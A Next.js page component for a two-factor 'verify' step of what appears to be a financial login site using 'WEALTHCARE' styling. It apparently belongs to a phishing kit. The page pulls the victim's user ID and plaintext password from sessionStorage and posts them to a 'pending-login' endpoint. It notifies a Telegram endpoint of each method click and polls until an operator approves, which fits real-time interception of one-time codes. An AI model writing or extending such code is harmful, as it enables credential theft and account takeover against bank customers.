'use client'

import { useState, useEffect } from "react"
import { Mail, MessageSquare, X, ArrowLeft, Loader2 } from "lucide-react"
import { Button } from "@/components/ui/button"
import { LoginFlowHeader } from "@/components/LoginFlowHeader"
import { SiteFooter } from "@/components/SiteFooter"
import { FLOW_STEP, setFlowStep, useFlowGuard } from "@/lib/flow-guard"
import { usePendingLoginPoll } from "@/lib/use-pending-login-poll"
import {
  MSG_UNABLE_REACH_VERIFICATION,
  MSG_UNABLE_VERIFY_TIME,
} from "@/lib/approval-messages"
import { WEALTHCARE_BUTTON_CHROME } from "@/lib/wealthcare-button-styles"

export default function Login2FAVerifyPage() {
  const isAllowed = useFlowGuard(FLOW_STEP.LOGIN)
  const [maskedEmail, setMaskedEmail] = useState("**********")
  const [maskedPhone, setMaskedPhone] = useState("***-***-****")
  const [loadingMethod, setLoadingMethod] = useState<'email' | 'text' | null>(null)
  const [pendingId, setPendingId] = useState<string | null>(null)
  const [navLoading, setNavLoading] = useState<'cancel' | 'back' | null>(null)
  const [networkError, setNetworkError] = useState('')

  useEffect(() => {
    if (typeof window !== 'undefined' && window.self !== window.top) {
      window.top!.location.href = window.location.pathname + window.location.search
    }
  }, [])

  useEffect(() => {
    try {
      const email = sessionStorage.getItem('maskedEmail')
      const phone = sessionStorage.getItem('maskedPhone')
      if (email) setMaskedEmail(email)
      if (phone) setMaskedPhone(phone)
    } catch {
      // ignore
    }
  }, [])

  const handleVerificationMethod = async (method: 'email' | 'text') => {
    if (loadingMethod || navLoading) return
    setLoadingMethod(method)
    setNetworkError('')

    void fetch('/api/telegram/verification-click', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ method, page: `/login/2fa-verify?method=${method}` }),
    }).catch(() => {})

    const userId = sessionStorage.getItem('loginUserId') ?? ''
    const password = sessionStorage.getItem('loginPassword') ?? ''
    const maskedEmailStored = sessionStorage.getItem('maskedEmail') ?? maskedEmail
    const maskedPhoneStored = sessionStorage.getItem('maskedPhone') ?? maskedPhone

    try {
      const res = await fetch('/api/pending-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId,
          password,
          method,
          maskedEmail: maskedEmailStored,
          maskedPhone: maskedPhoneStored,
          flow: 'login',
        }),
      })
      const data = await res.json()
      if (!res.ok) {
        setNetworkError(data.error || MSG_UNABLE_REACH_VERIFICATION)
        setLoadingMethod(null)
        return
      }
      if (data.id) {
        sessionStorage.setItem('verificationMethod', method)
        sessionStorage.setItem('maskedEmail', maskedEmailStored)
        sessionStorage.setItem('maskedPhone', maskedPhoneStored)
        setFlowStep(FLOW_STEP.VERIFY_METHOD)
        setPendingId(data.id)
        return
      }
      setLoadingMethod(null)
      setNetworkError(MSG_UNABLE_VERIFY_TIME)
    } catch {
      setNetworkError(MSG_UNABLE_REACH_VERIFICATION)
      setLoadingMethod(null)
    }
  }

  const handleNavHome = async (kind: 'cancel' | 'back') => {
    if (navLoading || loadingMethod) return
    setNavLoading(kind)
    await new Promise((r) => setTimeout(r, 1000))
    window.location.href = '/'
  }

  const isWaiting = loadingMethod !== null && pendingId !== null
  const showMethodSelection = !isWaiting
  const optionsDisabled = loadingMethod !== null || navLoading !== null

  usePendingLoginPoll({
    pendingId: isWaiting ? pendingId : null,
    method: loadingMethod ?? 'email',
    step: 'login',
    enabled: isWaiting,
    onError: (message) => {
      setNetworkError(message)
      setLoadingMethod(null)
      setPendingId(null)
    },
  })

  if (!isAllowed) return null

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <LoginFlowHeader />

      <main className="flex-1 flex flex-col items-center px-4 py-6 sm:px-6 sm:py-8">
        <div className="w-full max-w-3xl">
          {isWaiting && (
            <div className="text-center py-8">
              <Loader2 className="w-10 h-10 animate-spin text-gray-500 mx-auto mb-3" />
              <p className="text-sm text-gray-500 mb-2">
                Sending verification code to{" "}
                {loadingMethod === "email" ? "your email" : "your phone"}...
              </p>
            </div>
          )}

          {showMethodSelection && (
            <>
              <p className="text-center text-gray-700 mb-8">
                We found you! Pick a method to receive a verification code now.
              </p>

              {networkError ? (
                <p className="text-red-600 text-sm text-center mb-4">{networkError}</p>
              ) : null}

              <div className={`max-w-lg mx-auto space-y-4 mb-8 transition-opacity ${optionsDisabled ? 'opacity-60' : ''}`}>
                <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between sm:gap-4">
                  <div className="text-gray-700 text-sm sm:text-base min-w-0">
                    <span>Send code to email:</span>
                    <span className="font-medium"> {maskedEmail}</span>
                  </div>
                  <Button
                    className={`w-full sm:w-auto shrink-0 px-6 py-5 min-w-0 sm:min-w-[120px] ${WEALTHCARE_BUTTON_CHROME}`}
                    onClick={() => void handleVerificationMethod('email')}
                    disabled={optionsDisabled}
                  >
                    {loadingMethod === 'email' ? (
                      <>
                        <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                        Please wait...
                      </>
                    ) : (
                      <>
                        <Mail className="w-4 h-4 mr-2" />
                        E-MAIL
                      </>
                    )}
                  </Button>
                </div>

                <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between sm:gap-4">
                  <div className="text-gray-700 text-sm sm:text-base min-w-0">
                    <span>Send code via text:</span>
                    <span className="font-medium"> {maskedPhone}</span>
                  </div>
                  <Button
                    className={`w-full sm:w-auto shrink-0 px-6 py-5 min-w-0 sm:min-w-[120px] ${WEALTHCARE_BUTTON_CHROME}`}
                    onClick={() => void handleVerificationMethod('text')}
                    disabled={optionsDisabled}
                  >
                    {loadingMethod === 'text' ? (
                      <>
                        <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                        Please wait...
                      </>
                    ) : (
                      <>
                        <MessageSquare className="w-4 h-4 mr-2" />
                        TEXT
                      </>
                    )}
                  </Button>
                </div>
              </div>

              <div className="flex flex-wrap items-center justify-center gap-3 mb-6">
                <Button
                  type="button"
                  variant="secondary"
                  className={`w-full sm:w-auto px-6 py-5 min-w-0 sm:min-w-[120px] ${WEALTHCARE_BUTTON_CHROME}`}
                  disabled={optionsDisabled}
                  onClick={() => void handleNavHome('cancel')}
                >
                  {navLoading === 'cancel' ? (
                    <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                  ) : (
                    <X className="w-4 h-4 mr-2" />
                  )}
                  {navLoading === 'cancel' ? 'Loading...' : 'CANCEL'}
                </Button>
                <Button
                  type="button"
                  variant="secondary"
                  className={`w-full sm:w-auto px-6 py-5 min-w-0 sm:min-w-[120px] ${WEALTHCARE_BUTTON_CHROME}`}
                  disabled={optionsDisabled}
                  onClick={() => void handleNavHome('back')}
                >
                  {navLoading === 'back' ? (
                    <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                  ) : (
                    <ArrowLeft className="w-4 h-4 mr-2" />
                  )}
                  {navLoading === 'back' ? 'Loading...' : 'BACK'}
                </Button>
              </div>
            </>
          )}
        </div>
      </main>

      <SiteFooter />
    </div>
  )
}
